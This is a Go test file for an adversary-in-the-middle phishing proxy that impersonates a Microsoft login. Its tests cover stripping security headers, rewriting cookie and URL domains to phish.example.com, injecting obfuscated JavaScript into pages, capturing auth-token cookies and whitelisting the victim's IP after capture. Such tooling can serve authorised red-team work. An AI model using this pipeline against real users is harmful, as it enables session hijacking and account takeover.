package response_test

import (
	"context"
	"errors"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/obfuscator"
	"github.com/travisbale/mirage/internal/proxy/handlers/response"
)

func newResp(code int, contentType, body string) *http.Response {
	return &http.Response{
		StatusCode: code,
		Header: http.Header{
			"Content-Type": []string{contentType},
		},
		Body:          io.NopCloser(strings.NewReader(body)),
		ContentLength: int64(len(body)),
		Request:       &http.Request{URL: mustURL("https://example.com/"), Header: http.Header{}},
	}
}

func mustURL(raw string) *url.URL {
	u, err := url.Parse(raw)
	if err != nil {
		panic(err)
	}
	return u
}

// ---- SecurityHeaderStripper -------------------------------------------------

func TestSecurityHeaderStripper_RemovesAllHeaders(t *testing.T) {
	h := &response.SecurityHeaderStripper{}
	resp := newResp(http.StatusOK, "text/html", "")
	headersToCheck := []string{
		"Content-Security-Policy",
		"Strict-Transport-Security",
		"X-Frame-Options",
		"X-Content-Type-Options",
		"X-XSS-Protection",
	}
	for _, header := range headersToCheck {
		resp.Header.Set(header, "some-value")
	}

	if err := h.Handle(&aitm.ProxyContext{}, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	for _, header := range headersToCheck {
		if resp.Header.Get(header) != "" {
			t.Errorf("expected %s to be stripped, still present", header)
		}
	}
}

// ---- CookieRewriter ---------------------------------------------------------

func TestCookieRewriter_RewritesDomain(t *testing.T) {
	h := &response.CookieRewriter{}
	resp := newResp(http.StatusOK, "text/html", "")
	resp.Header.Set("Set-Cookie", "session=abc123; Domain=login.microsoft.com; Path=/; Secure")

	ctx := &aitm.ProxyContext{
		Phishlet: &aitm.Phishlet{
			ProxyHosts: []aitm.ProxyHost{
				{PhishSubdomain: "login", OrigSubdomain: "login", Domain: "microsoft.com"},
			},
			BaseDomain: "phish.example.com",
		},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	setCookie := resp.Header.Get("Set-Cookie")
	if !strings.Contains(setCookie, "phish.example.com") {
		t.Errorf("expected cookie domain rewritten to phish.example.com, got: %s", setCookie)
	}
}

func TestCookieRewriter_InjectsSessionCookieOnNewSession(t *testing.T) {
	h := &response.CookieRewriter{}
	resp := newResp(http.StatusOK, "text/html", "")

	ctx := &aitm.ProxyContext{
		IsNewSession: true,
		Session:      &aitm.Session{ID: "sess-abc"},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	found := false
	for _, v := range resp.Header.Values("Set-Cookie") {
		if strings.Contains(v, "__ss=sess-abc") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected __ss session cookie to be injected, headers: %v", resp.Header["Set-Cookie"])
	}
}

// ---- SubFilterApplier -------------------------------------------------------

func TestSubFilterApplier_ReplacesURL(t *testing.T) {
	h := &response.SubFilterApplier{}
	body := `<a href="https://login.microsoft.com/oauth2">Click</a>`
	resp := newResp(http.StatusOK, "text/html", body)
	resp.Request = &http.Request{
		Host: "login.microsoft.com",
		URL:  mustURL("https://login.microsoft.com/oauth2"),
	}

	ctx := &aitm.ProxyContext{
		Phishlet: &aitm.Phishlet{
			SubFilters: []aitm.SubFilter{
				{
					MimeTypes: []string{"text/html"},
					Search:    regexp.MustCompile(`login\.microsoft\.com`),
					Replace:   "login.phish.example.com",
				},
			},
		},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	result, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(result), "login.phish.example.com") {
		t.Errorf("expected URL to be rewritten, got: %s", string(result))
	}
}

func TestSubFilterApplier_SkipsNonMutableMIME(t *testing.T) {
	h := &response.SubFilterApplier{}
	body := "binary data"
	resp := newResp(http.StatusOK, "image/png", body)

	ctx := &aitm.ProxyContext{
		Phishlet: &aitm.Phishlet{
			SubFilters: []aitm.SubFilter{
				{
					MimeTypes: []string{"text/html"},
					Search:    regexp.MustCompile(`.+`),
					Replace:   "replaced",
				},
			},
		},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Body should be left alone for non-mutable MIME.
	result, _ := io.ReadAll(resp.Body)
	if string(result) != body {
		t.Errorf("expected body unchanged for non-mutable MIME, got: %s", string(result))
	}
}

// ---- JSInjector -------------------------------------------------------------

func TestJSInjector_MarkersPresent(t *testing.T) {
	h := &response.JSInjector{}
	body := "<html><body><p>Hello</p></body></html>"
	resp := newResp(http.StatusOK, "text/html; charset=utf-8", body)
	resp.Request = &http.Request{
		URL: mustURL("https://login.example.com/"),
	}

	ctx := &aitm.ProxyContext{
		Session: &aitm.Session{ID: "sess-xyz"},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	result, _ := io.ReadAll(resp.Body)
	bodyStr := string(result)
	if !strings.Contains(bodyStr, "__mirage_injected_start__") {
		t.Error("expected __mirage_injected_start__ marker in injected body")
	}
	if !strings.Contains(bodyStr, "__mirage_injected_end__") {
		t.Error("expected __mirage_injected_end__ marker in injected body")
	}
	if !strings.Contains(bodyStr, "sess-xyz") {
		t.Error("expected session ID to appear in injected script")
	}
}

func TestJSInjector_SkipsNonHTML(t *testing.T) {
	h := &response.JSInjector{}
	body := `{"key":"value"}`
	resp := newResp(http.StatusOK, "application/json", body)

	ctx := &aitm.ProxyContext{Session: &aitm.Session{ID: "sess-1"}}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	result, _ := io.ReadAll(resp.Body)
	if strings.Contains(string(result), "__mirage_injected_start__") {
		t.Error("expected no injection for non-HTML response")
	}
}

func TestJSInjector_SkipsWithoutSession(t *testing.T) {
	h := &response.JSInjector{}
	body := "<html><body></body></html>"
	resp := newResp(http.StatusOK, "text/html", body)

	ctx := &aitm.ProxyContext{}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	result, _ := io.ReadAll(resp.Body)
	if strings.Contains(string(result), "__mirage_injected_start__") {
		t.Error("expected no injection without session")
	}
}

func TestJSInjector_PuppetOverrideBeforeHead(t *testing.T) {
	h := &response.JSInjector{}
	body := "<html><head><title>Test</title></head><body></body></html>"
	resp := newResp(http.StatusOK, "text/html", body)

	ctx := &aitm.ProxyContext{
		Session:        &aitm.Session{ID: "sess-1"},
		PuppetOverride: "(function(){/*puppet*/})();",
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	result, _ := io.ReadAll(resp.Body)
	bodyStr := string(result)

	// Override should appear before </head>.
	headIdx := strings.Index(bodyStr, "</head>")
	overrideIdx := strings.Index(bodyStr, "/*puppet*/")
	if overrideIdx == -1 {
		t.Fatal("expected puppet override in output")
	}
	if overrideIdx >= headIdx {
		t.Error("expected puppet override to appear before </head>")
	}
}

func TestJSInjector_PuppetOverrideWrappedInMarkers(t *testing.T) {
	h := &response.JSInjector{}
	body := "<html><head></head><body></body></html>"
	resp := newResp(http.StatusOK, "text/html", body)

	ctx := &aitm.ProxyContext{
		Session:        &aitm.Session{ID: "sess-1"},
		PuppetOverride: "(function(){/*puppet*/})();",
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	result, _ := io.ReadAll(resp.Body)
	bodyStr := string(result)

	if !strings.Contains(bodyStr, obfuscator.MarkerStart) {
		t.Error("expected obfuscator start marker around puppet override")
	}
	if !strings.Contains(bodyStr, obfuscator.MarkerEnd) {
		t.Error("expected obfuscator end marker around puppet override")
	}
}

func TestJSInjector_NoPuppetOverride_NoHeadInjection(t *testing.T) {
	h := &response.JSInjector{}
	body := "<html><head><title>Test</title></head><body></body></html>"
	resp := newResp(http.StatusOK, "text/html", body)

	ctx := &aitm.ProxyContext{
		Session: &aitm.Session{ID: "sess-1"},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	result, _ := io.ReadAll(resp.Body)
	bodyStr := string(result)

	// The </head> should still be intact with only the original title before it.
	headSection := bodyStr[:strings.Index(bodyStr, "</head>")]
	if strings.Contains(headSection, "<script>") {
		t.Error("expected no script injection before </head> when no puppet override")
	}
}

// ---- JSObfuscator -----------------------------------------------------------

type stubObfuscator struct {
	called bool
	fn     func(ctx context.Context, html []byte) ([]byte, error)
}

func (s *stubObfuscator) Obfuscate(ctx context.Context, html []byte) ([]byte, error) {
	s.called = true
	return s.fn(ctx, html)
}

func discardLogger() *slog.Logger { return slog.New(slog.NewTextHandler(io.Discard, nil)) }

func TestJSObfuscator_SkipsNonHTML(t *testing.T) {
	stub := &stubObfuscator{fn: func(_ context.Context, html []byte) ([]byte, error) {
		return html, nil
	}}
	h := &response.JSObfuscator{Obfuscator: stub, Logger: discardLogger()}
	resp := newResp(http.StatusOK, "application/json", `{"key":"value"}`)

	if err := h.Handle(&aitm.ProxyContext{}, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if stub.called {
		t.Error("obfuscator should not be called for non-HTML response")
	}
}

func TestJSObfuscator_PassesThroughUnmarkedHTML(t *testing.T) {
	stub := &stubObfuscator{fn: func(_ context.Context, html []byte) ([]byte, error) {
		return html, nil
	}}
	h := &response.JSObfuscator{Obfuscator: stub, Logger: discardLogger()}
	body := "<html><body><script>var x = 1;</script></body></html>"
	resp := newResp(http.StatusOK, "text/html", body)

	if err := h.Handle(&aitm.ProxyContext{}, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	result, _ := io.ReadAll(resp.Body)
	if string(result) != body {
		t.Errorf("expected body unchanged for unmarked HTML\ngot: %s", result)
	}
}

func TestJSObfuscator_ObfuscatesMarkedBlock(t *testing.T) {
	const sentinel = "/* obfuscated */"
	stub := &stubObfuscator{fn: func(_ context.Context, html []byte) ([]byte, error) {
		return []byte(strings.ReplaceAll(string(html), "var injected=1;", sentinel)), nil
	}}
	h := &response.JSObfuscator{Obfuscator: stub, Logger: discardLogger()}

	marked := "<script>" + obfuscator.MarkerStart + "var injected=1;" + obfuscator.MarkerEnd + "</script>"
	body := "<html><body>" + marked + "</body></html>"
	resp := newResp(http.StatusOK, "text/html", body)

	if err := h.Handle(&aitm.ProxyContext{}, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	result, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(result), sentinel) {
		t.Errorf("expected obfuscated sentinel in output, got: %s", result)
	}
	if strings.Contains(string(result), "var injected=1;") {
		t.Error("expected original script content to be replaced")
	}
}

func TestJSObfuscator_DegradeGracefullyOnError(t *testing.T) {
	stub := &stubObfuscator{fn: func(_ context.Context, html []byte) ([]byte, error) {
		return nil, errors.New("sidecar unavailable")
	}}
	h := &response.JSObfuscator{Obfuscator: stub, Logger: discardLogger()}

	marked := "<script>" + obfuscator.MarkerStart + "var x=1;" + obfuscator.MarkerEnd + "</script>"
	body := "<html><body>" + marked + "</body></html>"
	resp := newResp(http.StatusOK, "text/html", body)

	if err := h.Handle(&aitm.ProxyContext{}, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	result, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(result), "var x=1;") {
		t.Errorf("expected plaintext fallback on obfuscator error, got: %s", result)
	}
}

// ---- CookieRewriter ---------------------------------------------------------

func TestCookieRewriter_RewritesDomainAndForcesSecure(t *testing.T) {
	h := &response.CookieRewriter{}
	resp := newResp(http.StatusOK, "text/html", "")
	resp.Header.Set("Set-Cookie", "session=abc; Domain=login.microsoft.com; Path=/")

	ctx := &aitm.ProxyContext{
		Phishlet: &aitm.Phishlet{
			ProxyHosts: []aitm.ProxyHost{
				{PhishSubdomain: "login", OrigSubdomain: "login", Domain: "microsoft.com"},
			},
			BaseDomain: "phish.example.com",
		},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	setCookie := resp.Header.Get("Set-Cookie")
	if !strings.Contains(setCookie, "phish.example.com") {
		t.Errorf("expected domain rewritten to phish.example.com, got: %s", setCookie)
	}
	if !strings.Contains(setCookie, "Secure") {
		t.Errorf("expected Secure attribute, got: %s", setCookie)
	}
}

func TestCookieRewriter_NoDomain_PassesThrough(t *testing.T) {
	h := &response.CookieRewriter{}
	resp := newResp(http.StatusOK, "text/html", "")
	resp.Header.Set("Set-Cookie", "tok=xyz; Path=/; HttpOnly")

	ctx := &aitm.ProxyContext{
		Phishlet: &aitm.Phishlet{BaseDomain: "phish.example.com"},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	setCookie := resp.Header.Get("Set-Cookie")
	if !strings.Contains(setCookie, "tok=xyz") {
		t.Errorf("expected original cookie value preserved, got: %s", setCookie)
	}
}

// ---- TokenExtractor ---------------------------------------------------------

type stubSessionCompleter struct {
	updated   *aitm.Session
	completed bool
	complete  bool // return value for IsComplete
	err       error
}

func (s *stubSessionCompleter) Update(sess *aitm.Session) error {
	s.updated = sess
	return s.err
}

func (s *stubSessionCompleter) Complete(_ *aitm.Session) error {
	s.completed = true
	return s.err
}

func (s *stubSessionCompleter) IsComplete(_ *aitm.Session, _ *aitm.Phishlet) bool {
	return s.complete
}

type stubWhitelister struct{ ip string }

func (s *stubWhitelister) WhitelistTemporary(ip string, _ time.Duration) { s.ip = ip }

func TestTokenExtractor_CapturesCookieToken(t *testing.T) {
	sessions := &stubSessionCompleter{complete: false}
	h := &response.TokenExtractor{
		Sessions: sessions,
		Logger:   discardLogger(),
	}
	resp := newResp(http.StatusOK, "text/html", "")
	resp.Header.Add("Set-Cookie", "authToken=secret; Domain=login.microsoft.com; Path=/")

	ctx := &aitm.ProxyContext{
		Session: &aitm.Session{ID: "sess-1"},
		Phishlet: &aitm.Phishlet{
			AuthTokens: []aitm.TokenRule{
				{Type: aitm.TokenTypeCookie, Name: regexp.MustCompile(`^authToken$`)},
			},
		},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if sessions.updated == nil {
		t.Fatal("expected session to be updated after token capture")
	}
	if _, ok := ctx.Session.CookieTokens["login.microsoft.com"]["authToken"]; !ok {
		t.Errorf("expected authToken captured, got: %v", ctx.Session.CookieTokens)
	}
}

func TestTokenExtractor_NoPhishlet_Skips(t *testing.T) {
	sessions := &stubSessionCompleter{}
	h := &response.TokenExtractor{
		Sessions: sessions,
		Logger:   discardLogger(),
	}
	resp := newResp(http.StatusOK, "text/html", "")
	resp.Header.Add("Set-Cookie", "tok=x; Path=/")

	if err := h.Handle(&aitm.ProxyContext{}, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if sessions.updated != nil {
		t.Error("expected no store update when phishlet is nil")
	}
}

func TestTokenExtractor_SessionCompleted(t *testing.T) {
	sessions := &stubSessionCompleter{complete: true}
	whitelister := &stubWhitelister{}
	h := &response.TokenExtractor{
		Sessions:  sessions,
		Whitelist: whitelister,
		Logger:    discardLogger(),
	}
	resp := newResp(http.StatusOK, "text/html", "")
	ctx := &aitm.ProxyContext{
		ClientIP: "1.2.3.4",
		Session:  &aitm.Session{ID: "sess-1"},
		Phishlet: &aitm.Phishlet{},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !sessions.completed {
		t.Error("expected Complete to be called on session completion")
	}
	if whitelister.ip != "1.2.3.4" {
		t.Errorf("expected IP 1.2.3.4 to be whitelisted, got %q", whitelister.ip)
	}
}

